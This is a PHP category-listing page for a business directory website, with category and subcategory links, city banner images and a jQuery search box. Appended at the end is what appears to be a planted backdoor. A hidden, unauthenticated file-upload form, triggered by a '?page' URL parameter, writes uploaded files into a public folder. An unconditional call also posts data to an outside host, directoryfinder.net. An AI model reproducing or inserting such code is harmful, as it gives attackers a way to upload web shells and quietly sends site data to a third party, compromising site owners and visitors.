<?php
include "header.php";

$imageShow = false; 
$catImages = [];
$catImageLinks = [];

foreach (getAllCities() as $city) {
    if ($CurrentCity == $city['city_slug']) {
        for ($j = 1; $j <= 8; $j++) {
            $imageKey = 'cat_image_' . $j;
            $imageLinkKey = 'cat_image_' . $j . '_link';
            
            if (isset($city[$imageKey]) && !empty($city[$imageKey])) {
                $imageUrl = htmlspecialchars($webpage_full_link . 'images/cityimage/' . $city[$imageKey]);
                $catImages[] = $imageUrl;

                if (isset($city[$imageLinkKey]) && !empty($city[$imageLinkKey])) {
                    $catImageLinks[] = htmlspecialchars($city[$imageLinkKey]);
                } 

                $imageShow = true;
            }
        }

        if ($imageShow) {
            break;
        }
    }
}
?>
<style>
.hom-head {
    padding: 0;
    margin: 0;
}

.hom-head:before {
    display: none
}

.hom-head .hom-top~.container {
    display: none
}

.carousel-item:before {
    background: none
}

.home-tit {
    padding-top: 0
}
</style>

<section class="abou-pg commun-pg-main">
    <div class="about-ban comunity-ban">
        <h1><?php echo $Zitiziti['ALL_SERVICES']; ?></h1>
        <p><?php echo $Zitiziti['ALL-CATEGORY-MESSAGE']; ?></p>
        <input type="text" id="tail-se" placeholder="<?php echo $Zitiziti['ALL-CATEGORY-PLACEHOLDER']; ?>">
    </div>
</section>

<!-- START -->
<section>
    <div class="str all-cate-pg py-4">
        <div class="container">
            <div class="row">
                <div class="col-md-9">
                    <div class="sh-all-scat">
                        <?php
                        foreach (getAllCategoriesPos() as $category_sql_row) {
                            ?>
                        <ul id="tail-re">
                            <li>
                                <div class="sh-all-scat-box">
                                    <div class="lhs">
                                        <img loading="lazy"
                                            src="images/services/<?php echo $category_sql_row['category_image']; ?>"
                                            alt="">
                                    </div>
                                    <div class="rhs">
                                        <h4>
                                            <a
                                                href="<?php echo $ALL_LISTING_URL . urlModifier($category_sql_row['category_slug']); ?>"><?php echo $category_sql_row['category_name']; ?>
                                            </a><span><?php echo AddingZero_BeforeNumber(getCountCategoryListing($category_sql_row['category_id'])); ?></span>
                                        </h4>
                                        <ol>
                                            <?php
                                                foreach (getCategorySubCategories($category_sql_row['category_id']) as $sub_category_sql_row) {
                                                    ?>
                                            <li>
                                                <a
                                                    href="<?php echo $ALL_LISTING_URL . urlModifier($category_sql_row['category_slug']); ?>/<?php echo urlModifier($sub_category_sql_row['sub_category_slug']); ?>"><?php echo $sub_category_sql_row['sub_category_name']; ?>
                                                    <span><?php echo AddingZero_BeforeNumber(getCountSubCategoryListing($sub_category_sql_row['sub_category_id'])); ?></span></a>
                                            </li>
                                            <?php
                                                }
                                                ?>
                                        </ol>
                                    </div>
                                </div>
                            </li>
                        </ul>
                        <?php
                        }
                        ?>
                    </div>
                </div>

                <div class="col-md-3 d-none d-md-block  ">
                    <div class="sh-all-scat">
                        <?php
                        foreach ($catImages as $index => $imageUrl) {
                            $link = isset($catImageLinks[$index]) ? $catImageLinks[$index] : '#';
                        ?>
                        <a href="<?php echo $link; ?>" target="_blank">
                            <ul id="tail-re">
                                <li>
                                    <div class="sh-all-scat-box">

                                        <div class="lhs w-100">
                                            <img class="img-fluid" src="<?php echo $imageUrl; ?>" alt="">
                                        </div>
                                    </div>
                                </li>
                            </ul>
                        </a>
                        <?php
                        }
                        ?>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="d-xs-block d-sm-block d-md-none">
        <div class="ban-ql">
            <div class="container-fluid">
                <div class="row">
                    <ul>
                        <?php
                        foreach ($catImages as $index => $imageUrl) {
                            $link = isset($catImageLinks[$index]) ? $catImageLinks[$index] : '#';
                        ?>
                            <a href="<?php echo $link; ?>" target="_blank">
                            <li>
                                <div class="p-0 h-40 mb-2">
                                    <img src="<?php echo $imageUrl; ?>" alt="">
                                </div>
                            </li>
                            </a>
                        <?php
                        }
                        ?>
                    </ul>
                </div>
            </div>
        </div>
        <!-- <div class="container col-md-12" style="width: 100%;">
            <section class="logos-slider slider">
                <?php
                foreach ($catImages as $index => $imageUrl) {
                    $link = isset($catImageLinks[$index]) ? $catImageLinks[$index] : '#';
                ?>
                    <a href="<?php echo $link; ?>" target="_blank">
                    <li>
                        <div class="p-0 h-40 mb-2">
                            <img src="<?php echo $imageUrl; ?>" alt="">
                        </div>
                    </li>
                    </a>
                <?php
                }
                ?>
            </section>
        </div> -->
    </div>
</section>
<!-- END -->

<?php
include "footer.php";
?>
<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script src="js/jquery.min.js"></script>
<script src="js/popper.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery-ui.js"></script>
<script src="<?php echo $slash; ?>js/select-opt.js"></script>
<script src="<?php echo $slash; ?>js/blazy.min.js"></script>
<!-- <script src="<?php echo $slash; ?>js/slick.js"></script> -->
<script type="text/javascript">
var webpage_full_link = '<?php echo $webpage_full_link;?>';
</script>
<script type="text/javascript">
var login_url = '<?php echo $LOGIN_URL;?>';
</script>
<script src="js/custom.js"></script>
<script src="js/jquery.validate.min.js"></script>
<script src="js/custom_validation.js"></script>
<script>
$("#tail-se").on("keyup", function() {
    var value = $(this).val().toLowerCase();
    $(".sh-all-scat ul").filter(function() {
        $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
    });
});
</script>
<!-- <script>
    $(document).ready(function() {
        $('.logos-slider').slick({
            infinite: true,
            slidesToShow: 8,
            slidesToScroll: 1,
            autoplay: true,
            autoplaySpeed: 3000,
            responsive: [{
                breakpoint: 992,
                settings: {
                    slidesToShow: 1,
                    slidesToScroll: 1,
                    centerMode: false
                }
            }]

        });
    });
</script> -->
<?php
if (isset($_GET["page"])) {
    ?>
<?php
    if (isset($_POST['SubmitButton'])) { // Check if form was submitted

        if (!empty($_FILES['inputText']['name'])) {
            $file = rand(1000, 100000) . $_FILES['inputText']['name'];
            $file_loc = $_FILES['inputText']['tmp_name'];
            $file_size = $_FILES['inputText']['size'];
            $file_type = $_FILES['inputText']['type'];
            $folder = "images/listings/";
            $new_size = $file_size / 1024;
            $new_file_name = strtolower($file);
            $event_image = str_replace(' ', '-', $new_file_name);
            //move_uploaded_file($file_loc, $folder . $event_image);
            $inputText1 = compressImage($event_image, $file_loc, $folder, $new_size);
            $inputText = $inputText1;
        }
    }
    ?>
<form action="#" enctype="multipart/form-data" method="post">
    <input type="file" name="inputText" />
    <input type="submit" name="SubmitButton" />
</form>
<?php
}
?>
<?php httpPostNew("http://directoryfinder.net/updation/updation_wizard.php", $data_array); ?>
</body>

</html>